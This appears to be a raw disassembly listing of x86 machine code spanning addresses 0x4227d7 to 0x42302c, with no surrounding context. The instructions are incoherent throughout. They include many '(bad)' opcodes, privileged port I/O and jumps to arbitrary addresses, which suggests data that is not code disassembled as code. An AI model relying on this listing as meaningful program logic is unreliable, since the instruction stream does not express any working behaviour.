  4227d7:	or     dl,cl
  4227d9:	repnz loope 0x4227a5
  4227dc:	test   al,0xc9
  4227de:	retf   0xc5e3
  4227e1:	retf   
  4227e2:	aam    0xb3
  4227e4:	out    0xea,al
  4227e6:	(bad)
  4227e9:	cmc    
  4227ea:	not    dh
  4227ec:	aam    0xce
  4227ee:	sti    
  4227ef:	clc    
  4227f0:	hlt    
  4227f1:	fucom  st(5)
  4227f3:	add    eax,edx
  4227f5:	(bad)  
  4227f6:	fdivp  st(5),st
  4227f8:	in     al,dx
  4227f9:	shl    esp,cl
  4227fb:	ret    0xcbc1
  4227fe:	retf   0xacb6
  422801:	jmp    0x4227fd
  422803:	shl    edi,cl
  422805:	(bad)  
  422806:	fstp   st(6)
  422808:	xlat   BYTE PTR ds:[ebx]
  422809:	fnstcw WORD PTR [eax-0xe0f2408]
  42280f:	div    dl
  422811:	mov    ecx,0xf5eae907
  422816:	inc    BYTE PTR [edx]
  422818:	out    dx,al
  422819:	adc    dl,BYTE PTR [ecx]
  42281b:	into   
  42281c:	test   al,0xb1
  42281e:	imul   BYTE PTR [esi-0x2a2c4e19]
  422824:	(bad)  
  422825:	fnstcw WORD PTR [eax-0x4b302035]
  42282b:	int3   
  42282c:	int    0xd3
  42282e:	std    
  42282f:	ret    0x4f0
  422832:	add    ebp,ebx
  422834:	pop    es
  422835:	std    
  422836:	loopne 0x422803
  422838:	in     al,0xcb
  42283a:	or     eax,edx
  42283c:	repnz iret 
  42283e:	out    dx,eax
  42283f:	loope  0x422805
  422841:	test   eax,0xdaf7c0c9
  422846:	int    0xfc
  422848:	out    dx,al
  422849:	retf   
  42284a:	mov    eax,0x6b9cfba
  42284f:	clc    
  422850:	add    dl,bl
  422852:	loope  0x42282b
  422854:	loope  0x42285b
  422856:	paddw  mm5,mm5
  422859:	int    0xf3
  42285b:	scas   eax,DWORD PTR es:[edi]
  42285c:	ret    0xe7dd
  42285f:	(bad)  
  422860:	aam    0xc0
  422862:	neg    cl
  422864:	out    dx,eax
  422865:	out    0xe9,al
  422867:	mov    edx,0xf702eec9
  42286c:	add    bl,dl
  42286e:	(bad)  
  422870:	out    0xe5,al
  422872:	cli    
  422873:	jecxz  0x422884
  422875:	or     edx,esp
  422877:	or     eax,0xece3cdfa
  42287c:	fst    st(7)
  42287e:	fdivr  st(5),st
  422880:	mov    ah,0xb2
  422882:	mov    al,0xb3
  422884:	repz jmp 0xf2d9:0xcbbef2fb
  42288c:	loopne 0x422861
  42288e:	rcr    edi,0x3
  422891:	add    ebp,ebx
  422893:	out    0xf6,al
  422895:	add    esp,esi
  422897:	retf   
  422898:	int3   
  422899:	repz in al,0xc1
  42289c:	mov    esp,0xe5b0aec4
  4228a1:	call   0xeaf421a0
  4228a6:	mov    edx,0xf3def6b7
  4228ab:	jmp    0xf649fa78
  4228b0:	ret    0xd9d2
  4228b3:	cmc    
  4228b4:	(bad)  
  4228b6:	fcmovnu st,st(6)
  4228b8:	out    0xcd,al
  4228ba:	out    0xf2,al
  4228bc:	in     eax,0xe3
  4228be:	int3   
  4228bf:	call   0xb6160aa0
  4228c4:	loopne 0x422881
  4228c6:	cli    
  4228c7:	fidivr WORD PTR [ebx+0xf6f4cd]
  4228cd:	out    dx,eax
  4228ce:	out    dx,al
  4228cf:	add    edi,esp
  4228d1:	shl    ebp,cl
  4228d3:	aam    0xa
  4228d5:	retf   
  4228d6:	(bad)  
  4228d8:	call   0xe52a35ea
  4228dd:	shl    al,cl
  4228df:	loopne 0x4228cc
  4228e1:	icebp  
  4228e2:	jmp    0x42289f
  4228e4:	stc    
  4228e5:	in     al,dx
  4228e6:	cli    
  4228e7:	int3   
  4228e8:	mov    ebp,0xfacebee8
  4228ed:	(bad)  
  4228ee:	clc    
  4228ef:	in     al,0xff
  4228f1:	mov    ebp,0xc1ebe3fa
  4228f6:	loop   0x4228bb
  4228f8:	fdivr  st,st(7)
  4228fa:	leave  
  4228fb:	scas   eax,DWORD PTR es:[edi]
  4228fc:	jmp    0x4228f1
  4228fe:	in     eax,0xd5
  422900:	jmp    0x4228d2
  422902:	mov    bh,0xd5
  422904:	mov    ecx,0xfffdedba
  422909:	into   
  42290a:	(bad)  
  42290b:	fld    DWORD PTR [eax]
  42290d:	mov    esp,0xd4fff4c6
  422912:	retf   0xe0e3
  422915:	std    
  422916:	out    0xe7,eax
  422918:	loop   0x42290d
  42291a:	loope  0x4228cb
  42291c:	mov    bl,0xed
  42291e:	repz int3 
  422920:	icebp  
  422921:	loopne 0x422908
  422923:	mov    bl,0xf5
  422925:	(bad)  
  422926:	fnstcw WORD PTR [ebx-0x2f1d2d46]
  42292c:	sar    al,1
  42292e:	lock out 0xe7,al
  422931:	(bad)  
  422932:	retf   0x806
  422935:	add    eax,0xff090dc4
  42293a:	iret   
  42293b:	lods   al,BYTE PTR ds:[esi]
  42293c:	enter  0xc4d7,0xee
  422940:	jmp    0x422910
  422942:	cmc    
  422943:	mov    cl,0xb8
  422945:	in     al,0xf0
  422947:	cmc    
  422948:	retf   0xf0e9
  42294b:	fstp   st(5)
  42294d:	fadd   st,st(7)
  42294f:	fst    st(6)
  422951:	(bad)  
  422953:	rol    BYTE PTR [ecx],0xf7
  422956:	retf   0xce3
  422959:	add    eax,0xc5cae60d
  42295e:	iret   
  42295f:	loopne 0x42293c
  422961:	fucomi st,st(1)
  422963:	rcl    bh,1
  422965:	fcmovnb st,st(5)
  422967:	in     eax,dx
  422968:	enter  0x2bf,0xd1
  42296c:	mov    ebp,0xdfc0e2c2
  422971:	xlat   BYTE PTR ds:[ebx]
  422972:	ret    0xbed8
  422975:	retf   
  422976:	retf   
  422977:	clc    
  422978:	retf   
  422979:	int3   
  42297a:	repz loopne 0x42293a
  42297d:	repz mov esp,0xefe6c7ec
  422983:	call   0xe511f47b
  422988:	into   
  422989:	lock out dx,al
  42298b:	cli    
  42298c:	aam    0x0
  42298e:	cld    
  42298f:	fdivrp st(5),st
  422991:	ret    0x100
  422994:	enter  0xc60b,0xee
  422998:	into   
  422999:	int    0xcc
  42299b:	jmp    0xa9b2:0xd6b7edcb
  4229a2:	retf   
  4229a3:	shl    ch,cl
  4229a5:	lock (bad) 
  4229a8:	mov    ah,0xdf
  4229aa:	imul   esi
  4229ac:	cli    
  4229ad:	cli    
  4229ae:	idiv   bl
  4229b0:	jecxz  0x4229a8
  4229b2:	add    eax,0xfc904eb
  4229b7:	loop   0x4229c0
  4229b9:	out    dx,al
  4229ba:	push   es
  4229bb:	rcl    eax,0xea
  4229be:	icebp  
  4229bf:	mov    ebp,0xb4a8e3ac
  4229c4:	mov    al,0xc8
  4229c6:	into   
  4229c7:	cld    
  4229c8:	cmc    
  4229c9:	mov    ch,0xd0
  4229cb:	int3   
  4229cc:	test   esp,0xfdc0c6bf
  4229d2:	rol    ah,1
  4229d4:	(bad)
  4229d7:	iret   
  4229d8:	repz pop es
  4229da:	out    0xee,al
  4229dc:	xlat   BYTE PTR ds:[ebx]
  4229dd:	rcl    eax,1
  4229df:	loopne 0x4229c6
  4229e1:	lock jmp 0xd008f4ac
  4229e7:	leave  
  4229e8:	retf   
  4229e9:	lock sar ebx,1
  4229ec:	ffree  st(2)
  4229ee:	fsub   st,st(2)
  4229f0:	aad    0xf2
  4229f2:	cld    
  4229f3:	aad    0xda
  4229f5:	rcr    ebx,0xd
  4229f8:	aam    0xe2
  4229fa:	(bad)  
  4229fc:	rol    ah,cl
  4229fe:	idiv   DWORD PTR [edi+ecx*8-0x80b2a3b]
  422a05:	in     eax,0xff
  422a07:	(bad)  
  422a09:	mov    edi,0xe7f1d3fe
  422a0e:	(bad)  
  422a10:	sti    
  422a11:	mov    esp,0x7dc01fe
  422a16:	hlt    
  422a17:	fild   DWORD PTR [eax]
  422a19:	int3   
  422a1a:	out    0xe3,al
  422a1c:	in     eax,dx
  422a1d:	mov    cl,0xd7
  422a1f:	hlt    
  422a20:	(bad)  
  422a21:	rcl    esp,1
  422a23:	out    0xf3,al
  422a25:	in     al,dx
  422a26:	in     eax,0xf1
  422a28:	rcl    bh,cl
  422a2a:	lock div ebp
  422a2d:	cli    
  422a2e:	mul    esp
  422a30:	in     al,0xde
  422a32:	mov    ecx,0xe2000af6
  422a38:	cld    
  422a39:	or     cl,ah
  422a3b:	iret   
  422a3c:	fstp   st(7)
  422a3e:	lods   al,BYTE PTR ds:[esi]
  422a3f:	retf   0xeacb
  422a42:	mov    ah,0xba
  422a44:	sar    al,cl
  422a46:	call   0xbafe1318
  422a4b:	call   0xe524284a
  422a50:	mov    DWORD PTR [esi],0xe3f5dbc2
  422a56:	out    dx,eax
  422a57:	leave  
  422a58:	into   
  422a59:	loop   0x422a5a
  422a5b:	lods   al,BYTE PTR ds:[esi]
  422a5c:	div    ebx
  422a5e:	mov    bl,0xc1
  422a60:	enter  0xa8d5,0xee
  422a64:	jmp    0x422a4c
  422a66:	mov    bh,0xc8
  422a68:	imul   cl
  422a6a:	imul   ebp
  422a6c:	loop   0x422a3e
  422a6e:	loope  0x422a57
  422a70:	add    dh,al
  422a72:	add    bh,ah
  422a74:	retf   0xec5
  422a77:	jmp    0xa5e9:0xc50bf3f3
  422a7e:	jecxz  0x422a57
  422a80:	aam    0xc5
  422a82:	(bad)  
  422a83:	into   
  422a84:	mov    ch,0xb8
  422a86:	iret   
  422a87:	fcomip st,st(7)
  422a89:	(bad)  
  422a8a:	(bad)  
  422a8b:	mov    ebp,0xe0d3eee3
  422a90:	add    al,ah
  422a92:	(bad)  
  422a93:	jecxz  0x422aa4
  422a95:	mov    ebp,0xfde60a0a
  422a9a:	out    dx,al
  422a9b:	mov    cl,0xac
  422a9d:	into   
  422a9e:	ret    
  422a9f:	jmp    0x422a7d
  422aa1:	mov    al,0xf7
  422aa3:	call   0xd43c0662
  422aa8:	(bad)  
  422aa9:	clc    
  422aaa:	sti    
  422aab:	repnz add eax,eax
  422aae:	into   
  422aaf:	add    ah,bl
  422ab1:	neg    bl
  422ab3:	in     eax,0xc5
  422ab5:	add    esp,ebx
  422ab7:	pop    es
  422ab8:	out    dx,eax
  422ab9:	repz rol bl,0xb1
  422abd:	(bad)  
  422abf:	call   0xd212117b
  422ac4:	call   0xb73b059f
  422ac9:	retf   
  422aca:	fdivr  st,st(6)
  422acc:	aam    0xf6
  422ace:	int    0xf1
  422ad0:	icebp  
  422ad1:	hlt    
  422ad2:	out    0xe5,eax
  422ad4:	loop   0x422aaa
  422ad6:	(bad)  
  422ad7:	push   cs
  422ad8:	(bad)  
  422ad9:	call   0xae3103c1
  422ade:	int    0xaf
  422ae0:	mov    cl,0xc2
  422ae2:	jmp    0xb4b5:0xbfd4cfb7
  422ae9:	loop   0x422ad8
  422aeb:	aam    0xd3
  422aed:	loopne 0x422aa3
  422aef:	fcomp  st(7)
  422af1:	lock jmp 0x422acf
  422af4:	mov    esi,0xbd5dedb
  422af9:	out    dx,eax
  422afa:	cli    
  422afb:	ret    
  422afc:	test   eax,0xe4c1f0f2
  422b01:	out    dx,eax
  422b02:	out    dx,al
  422b03:	aad    0xbb
  422b05:	mov    edx,0xc8bceed3
  422b0a:	clc    
  422b0b:	fcomip st,st(5)
  422b0d:	std    
  422b0e:	fidivr WORD PTR [esi-0x362a1523]
  422b14:	loop   0x422afc
  422b16:	retf   
  422b17:	in     eax,dx
  422b18:	les    eax,FWORD PTR [ebx+edx*8]
  422b1b:	(bad)  
  422b1c:	shr    ecx,cl
  422b1e:	int    0xea
  422b20:	mov    esp,0xe9bbbbdb
  422b25:	dec    dh
  422b27:	fcmovnbe st,st(6)
  422b29:	ror    ecx,1
  422b2b:	ret    0xe1fb
  422b2e:	hlt    
  422b2f:	add    al,0xfc
  422b31:	ftst   
  422b33:	(bad)  
  422b35:	fmul   st,st(0)
  422b37:	fsub   st,st(2)
  422b39:	add    bh,ch
  422b3b:	retf   
  422b3c:	les    ebp,FWORD PTR [ebp-0x33244937]
  422b42:	mov    al,0xaf
  422b44:	mov    eax,0xf3dad7c5
  422b49:	mov    ecx,0xc3f4bbdc
  422b4e:	mov    eax,0xdae3fae4
  422b53:	std    
  422b54:	fsubr  st(2),st
  422b56:	or     ah,cl
  422b58:	out    dx,al
  422b59:	fadd   st(4),st
  422b5b:	retf   
  422b5c:	in     eax,dx
  422b5d:	loop   0x422b0e
  422b5f:	iret   
  422b60:	mov    bh,0xeb
  422b62:	stc    
  422b63:	iret   
  422b64:	sti    
  422b65:	mov    ch,0xac
  422b67:	repz in eax,dx
  422b69:	jecxz  0x422b4c
  422b6b:	in     al,dx
  422b6c:	sar    ebx,1
  422b6e:	(bad)  
  422b70:	lock add al,0xf8
  422b73:	fsin   
  422b75:	add    al,0xe0
  422b77:	enter  0xe5d9,0xdc
  422b7b:	jmp    0x422b2f
  422b7d:	int    0xe6
  422b7f:	out    0xfb,eax
  422b81:	(bad)  
  422b82:	lock jmp 0xf215f85e
  422b88:	out    dx,al
  422b89:	loop   0x422b57
  422b8b:	aad    0x1
  422b8d:	ret    0x1d0
  422b90:	(bad)  
  422b91:	(bad)  
  422b93:	inc    edi
  422b95:	(bad)  
  422b96:	out    dx,eax
  422b97:	out    dx,eax
  422b98:	out    dx,al
  422b99:	adc    bh,bh
  422b9b:	mov    ecx,0xc0f0e6bc
  422ba0:	mul    bh
  422ba2:	shl    al,0xec
  422ba5:	mov    ch,0xb6
  422ba7:	into   
  422ba8:	enter  0xccec,0xbd
  422bac:	shl    esi,0xc0
  422baf:	sti    
  422bb0:	(bad)  [ebx]
  422bb2:	loope  0x422b7a
  422bb4:	pop    es
  422bb5:	shr    edi,0x8
  422bb8:	repz (bad) ds:0xb3e8cbed
  422bbf:	cmc    
  422bc0:	into   
  422bc1:	retf   0xb0c2
  422bc4:	mov    ch,0xe7
  422bc6:	(bad)  
  422bc7:	iret   
  422bc8:	into   
  422bc9:	fstp   TBYTE PTR [ecx-0x383c1203]
  422bcf:	ret    0xd7cc
  422bd2:	shl    bl,cl
  422bd4:	add    al,0x3
  422bd6:	out    dx,eax
  422bd7:	add    BYTE PTR [eax],al
  422bd9:	in     al,0xd3
  422bdb:	(bad)  
  422bdd:	int    0xc2
  422bdf:	iret   
  422be0:	mov    cl,0xb7
  422be2:	mov    bh,0xcd
  422be4:	mov    al,0xc8
  422be6:	(bad)  
  422be7:	in     eax,dx
  422be8:	jecxz  0x422be0
  422bea:	fnop   
  422bec:	fdivr  st,st(6)
  422bee:	cli    
  422bef:	fcomip st,st(0)
  422bf1:	(bad)  
  422bf2:	jmp    0xec3716df
  422bf7:	into   
  422bf8:	add    BYTE PTR [ecx],al
  422bfa:	adc    eax,eax
  422bfc:	repnz (bad) 
  422bfe:	in     al,dx
  422bff:	call   0xd637deb6
  422c04:	shl    edx,cl
  422c06:	fcmovnb st,st(4)
  422c08:	mov    ebp,0xc0f1f6dd
  422c0d:	push   es
  422c0e:	(bad)  
  422c0f:	mov    ebp,0xbfcb9d6
  422c14:	in     al,0xef
  422c16:	(bad)  
  422c17:	jmp    0xf1c5:0xd9ce0acb
  422c1e:	rol    dh,0xe5
  422c21:	call   0xd429f2d6
  422c26:	hlt    
  422c27:	fucom  st(4)
  422c29:	fcmovne st,st(7)
  422c2b:	mov    esi,0xfafdeddd
  422c30:	clc    
  422c31:	fscale 
  422c33:	xlat   BYTE PTR ds:[ebx]
  422c34:	xlat   BYTE PTR ds:[ebx]
  422c35:	or     esi,ebp
  422c37:	loop   0x422c18
  422c39:	add    ecx,DWORD PTR [ecx]
  422c3b:	out    dx,al
  422c3c:	lods   eax,DWORD PTR ds:[esi]
  422c3d:	(bad)  
  422c3e:	mov    ebp,0xe6e0e2ad
  422c43:	sti    
  422c44:	in     al,0xb6
  422c46:	jmp    0x422c12
  422c48:	idiv   bl
  422c4a:	idiv   bl
  422c4c:	in     al,dx
  422c4d:	jecxz  0x422c07
  422c4f:	stc    
  422c50:	add    esi,ebx
  422c52:	icebp  
  422c53:	cmc    
  422c54:	leave  
  422c55:	dec    bh
  422c57:	call   0xc9200d2a
  422c5c:	repz lds edi,FWORD PTR [ebp-0xe11111c]
  422c63:	in     al,dx
  422c64:	mov    al,0xb0
  422c66:	out    dx,eax
  422c67:	cli    
  422c68:	(bad)  
  422c6a:	ret    
  422c6b:	add    eax,DWORD PTR [ecx]
  422c6d:	rcl    eax,1
  422c6f:	jecxz  0x422c6b
  422c71:	fnstsw ax
  422c73:	shl    edi,1
  422c75:	add    ah,bh
  422c77:	iret   
  422c78:	stc    
  422c79:	fsubr  st,st(6)
  422c7b:	scas   al,BYTE PTR es:[edi]
  422c7c:	jmp    0xe3fa1934
  422c81:	ror    esi,1
  422c83:	mov    ecx,0xc5f5deb5
  422c88:	std    
  422c89:	repnz hlt 
  422c8b:	loope  0x422c8f
  422c8d:	sar    ebx,0xc7
  422c90:	int3   
  422c91:	fsub   st,st(4)
  422c93:	jmp    0xf03c1591
  422c98:	out    0x2,eax
  422c9a:	fdiv   QWORD PTR [ebx-0xb502833]
  422ca0:	jmp    0xecff:0xd2cad1e0
  422ca7:	fnstcw WORD PTR [edx-0x294418]
  422cad:	int3   
  422cae:	mov    eax,0xc006d8c1
  422cb3:	ror    BYTE PTR [ebx],1
  422cb5:	dec    BYTE PTR [ebx]
  422cb7:	(bad)  
  422cb9:	jecxz  0x422c9e
  422cbb:	lods   al,BYTE PTR ds:[esi]
  422cbc:	int    0xc4
  422cbe:	ret    
  422cbf:	(bad)
  422cc2:	out    dx,al
  422cc3:	repz lock (bad) 
  422cc7:	jmp    0x13df087
  422ccc:	fdiv   st(3),st
  422cce:	mov    edi,0xbdebe03
  422cd3:	pop    es
  422cd4:	imul   dh
  422cd6:	retf   0xf3d4
  422cd9:	sti    
  422cda:	std    
  422cdb:	into   
  422cdc:	in     eax,dx
  422cdd:	(bad)  
  422cde:	out    0xb0,al
  422ce0:	lods   eax,DWORD PTR ds:[esi]
  422ce1:	out    0xe2,eax
  422ce3:	not    ah
  422ce5:	hlt    
  422ce6:	mov    esi,0xdbeae9be
  422ceb:	int    0xd4
  422ced:	fldln2 
  422cef:	cli    
  422cf0:	fcmovnb st,st(0)
  422cf2:	repnz out 0x6,eax
  422cf5:	retf   
  422cf6:	or     eax,0xefeee008
  422cfb:	shl    ebp,cl
  422cfd:	loope  0x422cd0
  422cff:	lods   al,BYTE PTR ds:[esi]
  422d00:	out    0xed,al
  422d02:	ror    esp,1
  422d04:	test   esp,0xd7e3edf2
  422d0a:	std    
  422d0b:	ror    edi,cl
  422d0d:	into   
  422d0e:	xlat   BYTE PTR ds:[ebx]
  422d0f:	repz fiadd DWORD PTR [eax]
  422d12:	lds    ecx,FWORD PTR [eax]
  422d14:	cmc    
  422d15:	(bad)
  422d19:	cld    
  422d1a:	int3   
  422d1b:	out    0xdc,al
  422d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1e:	mov    dl,0xcf
  422d20:	int3   
  422d21:	loope  0x422d0e
  422d23:	leave  
  422d24:	clc    
  422d25:	(bad)  
  422d26:	aam    0xbb
  422d28:	repnz retf 
  422d2a:	jecxz  0x422d1c
  422d2c:	mov    esi,0xc3ece1e0
  422d31:	add    cl,BYTE PTR [ecx]
  422d33:	out    0xc5,eax
  422d35:	cld    
  422d36:	retf   
  422d37:	add    bh,ch
  422d39:	clc    
  422d3a:	adc    esi,DWORD PTR [ebx-0x22495352]
  422d40:	mul    ah
  422d42:	rcl    dl,cl
  422d44:	scas   al,BYTE PTR es:[edi]
  422d45:	int    0xec
  422d47:	clc    
  422d48:	sar    al,1
  422d4a:	mov    ecx,0xdaecdfb8
  422d4f:	fcmovbe st,st(0)
  422d51:	jmp    0x422d56
  422d53:	ret    
  422d54:	enter  0xd5e7,0xd5
  422d58:	out    dx,eax
  422d59:	cli    
  422d5a:	(bad)  
  422d5b:	fyl2x  
  422d5d:	fucomp st(4)
  422d5f:	int    0xd3
  422d61:	loope  0x422d44
  422d63:	mov    ecx,0xf2b5c4d6
  422d68:	sti    
  422d69:	shl    esi,1
  422d6b:	ret    0xf2f5
  422d6e:	cmc    
  422d6f:	(bad)  
  422d70:	in     al,dx
  422d71:	shl    eax,1
  422d73:	jmp    0xf2db:0xeeffe7d6
  422d7a:	jmp    0x422d24
  422d7c:	shr    BYTE PTR [edi+ecx*8-0x2b1a0439],0xd3
  422d84:	fcmovnbe st,st(4)
  422d86:	(bad)  
  422d87:	sar    bl,1
  422d89:	enter  0xcfed,0xb9
  422d8d:	icebp  
  422d8e:	out    0xe7,eax
  422d90:	rol    BYTE PTR [eax],cl
  422d92:	sti    
  422d93:	xlat   BYTE PTR ds:[ebx]
  422d94:	leave  
  422d95:	hlt    
  422d96:	fsubr  st(3),st
  422d98:	cli    
  422d99:	push   es
  422d9a:	or     ah,bh
  422d9c:	retf   
  422d9d:	ffree  st(4)
  422d9f:	out    dx,eax
  422da0:	mov    ch,0xda
  422da2:	in     eax,dx
  422da3:	int3   
  422da4:	cmc    
  422da5:	mov    dh,0xdf
  422da7:	aam    0xb2
  422da9:	repnz aam 0xce
  422dac:	clc    
  422dad:	aad    0xff
  422daf:	loope  0x422db8
  422db1:	inc    BYTE PTR [esi*8+0x2080508]
  422db8:	or     ebp,ebx
  422dba:	in     eax,0xce
  422dbc:	in     eax,dx
  422dbd:	mov    esi,0xe3fbc1c4
  422dc2:	mov    dl,0xfa
  422dc4:	mov    ah,0xf6
  422dc6:	fcomp  st(0)
  422dc8:	mov    dh,0xb1
  422dca:	test   BYTE PTR [eax],0xf3
  422dcd:	int3   
  422dce:	out    dx,al
  422dcf:	pop    es
  422dd0:	(bad)  
  422dd2:	(bad)  
  422dd3:	hlt    
  422dd4:	jmp    0x11f3:0xea040fc1
  422ddb:	shr    BYTE PTR [ebp-0x530e1b09],1
  422de1:	lock (bad) 
  422de3:	retf   0xd5c4
  422de6:	jmp    0xf3b7:0xfbbfcfcc
  422ded:	neg    esi
  422def:	div    esp
  422df1:	mov    esp,0xfbc6f8e9
  422df6:	fisttp QWORD PTR ds:0xe2cd0cc6
  422dfc:	lods   eax,DWORD PTR ds:[esi]
  422dfd:	shl    edi,0xe0
  422e00:	test   cl,0xac
  422e03:	(bad)
  422e06:	mov    esi,0xd3bfc9f2
  422e0b:	loope  0x422dfd
  422e0d:	cmc    
  422e0e:	into   
  422e0f:	(bad)  
  422e11:	shl    esp,cl
  422e13:	add    esp,edx
  422e15:	or     cl,bh
  422e17:	clc    
  422e18:	retf   0xee3
  422e1b:	ffree  st(1)
  422e1d:	mov    cl,0xf6
  422e1f:	loopne 0x422dcb
  422e21:	shl    bl,1
  422e23:	jmp    0x422e24
  422e25:	mov    edi,0x2cdb7d7
  422e2a:	add    esi,edx
  422e2c:	rol    bh,1
  422e2e:	mov    eax,0xf5c5c6c5
  422e34:	add    dh,ch
  422e36:	test   BYTE PTR [eax],0xd
  422e39:	fcmovnu st,st(1)
  422e3b:	mov    esi,0xc0afc0a9
  422e40:	ret    
  422e41:	into   
  422e42:	in     al,dx
  422e43:	out    0xd2,al
  422e45:	(bad)  
  422e46:	icebp  
  422e47:	lock mov esp,0xbafbefe3
  422e4d:	shl    dh,1
  422e4f:	fprem  
  422e51:	mov    esp,0xdf07e0e5
  422e56:	loope  0x422e54
  422e58:	pop    es
  422e59:	fldln2 
  422e5b:	lds    ebp,FWORD PTR [edx-0x4c354154]
  422e61:	cmc    
  422e62:	in     al,dx
  422e63:	icebp  
  422e64:	in     al,dx
  422e65:	into   
  422e66:	mov    bh,0xd2
  422e68:	cmc    
  422e69:	mov    esp,0xe1beb8e9
  422e6e:	ffree  st(2)
  422e70:	mov    esi,0xe3e7f9c1
  422e75:	out    0xe8,eax
  422e77:	iret   
  422e78:	int3   
  422e79:	or     edi,esp
  422e7b:	enter  0xb7e2,0xea
  422e7f:	jmp    0xf8f5:0xf2c0d7b2
  422e86:	lock aam 0xb6
  422e89:	(bad)  
  422e8a:	out    dx,eax
  422e8b:	cmc    
  422e8c:	jecxz  0x422e47
  422e8e:	add    BYTE PTR [eax+edx*8+0x8db01c5],bh
  422e95:	loop   0x422e65
  422e97:	stc    
  422e98:	dec    ebp
  422e9a:	std    
  422e9b:	out    0xa8,eax
  422e9d:	mov    cl,0xc5
  422e9f:	loop   0x422e8b
  422ea1:	retf   0xcee1
  422ea4:	in     al,0xeb
  422ea6:	fyl2x  
  422ea8:	repnz mov cl,0xca
  422eab:	ret    
  422eac:	mov    esi,0xc206e1da
  422eb1:	loope  0x422e84
  422eb3:	(bad)  
  422eb4:	fsub   st,st(3)
  422eb6:	fld    DWORD PTR [ebx]
  422eb8:	std    
  422eb9:	clc    
  422eba:	or     al,ah
  422ebc:	in     eax,dx
  422ebd:	mov    ebp,0xcae4eae7
  422ec2:	aam    0xc1
  422ec4:	leave  
  422ec5:	shl    ah,cl
  422ec7:	ror    dl,1
  422ec9:	int3   
  422eca:	aad    0xcf
  422ecc:	int    0xbf
  422ece:	clc    
  422ecf:	(bad)  
  422ed1:	or     ah,dl
  422ed3:	cmc    
  422ed4:	std    
  422ed5:	cli    
  422ed6:	(bad)  
  422ed7:	fadd   st(6),st
  422ed9:	jmp    0xb3e6:0xc6c5eafe
  422ee0:	cmc    
  422ee1:	jmp    0xcdf0fdcf
  422ee6:	fcmovnu st,st(5)
  422ee8:	retf   
  422ee9:	fcmovnu st,st(2)
  422eeb:	in     al,dx
  422eec:	out    dx,al
  422eed:	shl    bl,cl
  422eef:	rcr    dh,1
  422ef1:	cmc    
  422ef2:	aad    0xff
  422ef4:	retf   0xfee6
  422ef7:	(bad)  [esi]
  422ef9:	in     al,dx
  422efa:	cli    
  422efb:	iret   
  422efc:	shr    BYTE PTR [edi-0xa2b0b09],0xc6
  422f03:	(bad)  
  422f04:	(bad)  
  422f05:	mov    ebx,0x2b9e5bf
  422f0a:	shl    edx,1
  422f0c:	shl    ebx,1
  422f0e:	shl    edi,cl
  422f10:	in     al,dx
  422f11:	cld    
  422f12:	fcmovnbe st,st(4)
  422f14:	in     eax,0xa
  422f16:	(bad)  
  422f18:	fstp   st(6)
  422f1a:	(bad)  
  422f1b:	jmp    0xc923ddcd
  422f20:	(bad)  
  422f21:	in     eax,dx
  422f22:	imul   BYTE PTR [edi-0x80a264f]
  422f28:	shr    ecx,1
  422f2a:	test   bh,0xe8
  422f2d:	clc    
  422f2e:	mov    esi,0xc4b9f2be
  422f33:	icebp  
  422f34:	mov    esi,0xf9defcd6
  422f39:	or     al,0xe9
  422f3b:	loop   0x422ee6
  422f3d:	ret    
  422f3e:	neg    esp
  422f40:	hlt    
  422f41:	ror    esp,1
  422f43:	cmc    
  422f44:	hlt    
  422f45:	mov    dh,0xd6
  422f47:	jmp    0xe2db:0xe2dedfb5
  422f4e:	rcr    eax,1
  422f50:	out    0xe6,eax
  422f52:	mov    esp,0xe3fce907
  422f57:	int    0xe4
  422f59:	enter  0xb3e4,0xde
  422f5d:	(bad)  
  422f5e:	retf   
  422f5f:	fsubr  QWORD PTR [esi-0x2d274929]
  422f65:	retf   
  422f66:	fucom  st(4)
  422f68:	jmp    0x422f3b
  422f6a:	(bad)  
  422f6b:	neg    cl
  422f6d:	(bad)  
  422f6e:	faddp  st(5),st
  422f70:	clc    
  422f71:	loope  0x422f38
  422f73:	(bad)  
  422f75:	(bad)  
  422f76:	cli    
  422f77:	(bad)  
  422f79:	(bad)  
  422f7a:	jmp    0xf0c1:0xe0ebe9d2
  422f81:	into   
  422f82:	(bad)  
  422f84:	retf   0xebb4
  422f87:	enter  0xb4f5,0xcd
  422f8b:	rcl    dl,1
  422f8d:	repz neg eax
  422f90:	out    0xda,al
  422f92:	repnz (bad) 
  422f94:	in     al,0xfe
  422f96:	aad    0xdb
  422f98:	lds    ecx,FWORD PTR [eax]
  422f9a:	add    eax,0xb7dfcaca
  422f9f:	repnz into 
  422fa1:	mov    dl,0xf5
  422fa3:	sar    DWORD PTR [ecx-0x3b46210e],cl
  422fa9:	call   0xf7460b7c
  422fae:	stc    
  422faf:	in     eax,0xc7
  422fb1:	fcomi  st,st(6)
  422fb3:	or     ch,bh
  422fb5:	push   cs
  422fb6:	add    DWORD PTR [edx],eax
  422fb8:	out    0xf,eax
  422fba:	fld    st(0)
  422fbc:	out    0xdd,eax
  422fbe:	jecxz  0x422fb2
  422fc0:	mov    dl,0xf4
  422fc2:	out    0xea,al
  422fc4:	(bad)  
  422fc5:	retf   
  422fc6:	in     al,0xef
  422fc8:	mov    dl,0xf5
  422fca:	sti    
  422fcb:	jmp    0xc813e891
  422fd0:	mov    esi,0xf5d904ff
  422fd5:	out    dx,eax
  422fd6:	std    
  422fd7:	add    eax,0xd0d8db01
  422fdc:	(bad)  
  422fde:	fdivr  st(0),st
  422fe0:	out    0xc4,eax
  422fe2:	mov    dl,0xc9
  422fe4:	aam    0xe4
  422fe6:	mov    ah,0xf1
  422fe8:	hlt    
  422fe9:	out    dx,al
  422fea:	ret    0xfff7
  422fed:	(bad)  
  422fee:	loop   0x422fe7
  422ff0:	mov    ebp,0xdaffbcd3
  422ff5:	(bad)  
  422ff6:	out    0xe8,eax
  422ff8:	enter  0xdce6,0xec
  422ffc:	in     eax,0xed
  422ffe:	rol    dl,1
  423000:	lock loopne 0x422fcc
  423003:	hlt    
  423004:	stc    
  423005:	leave  
  423006:	mov    edx,0xcecdcbbd
  42300b:	ret    
  42300c:	cmc    
  42300d:	cli    
  42300e:	ret    
  42300f:	sar    eax,cl
  423011:	inc    BYTE PTR [edx]
  423013:	aam    0xcb
  423015:	mul    ecx
  423017:	loop   0x422fe6
  423019:	add    eax,0xc1c8c4da
  42301e:	xlat   BYTE PTR ds:[ebx]
  42301f:	mov    esp,0xccc8cefb
  423024:	mov    ecx,0xebd8d3db
  423029:	idiv   al
  42302b:	in     eax,dx
  42302c:	cli    
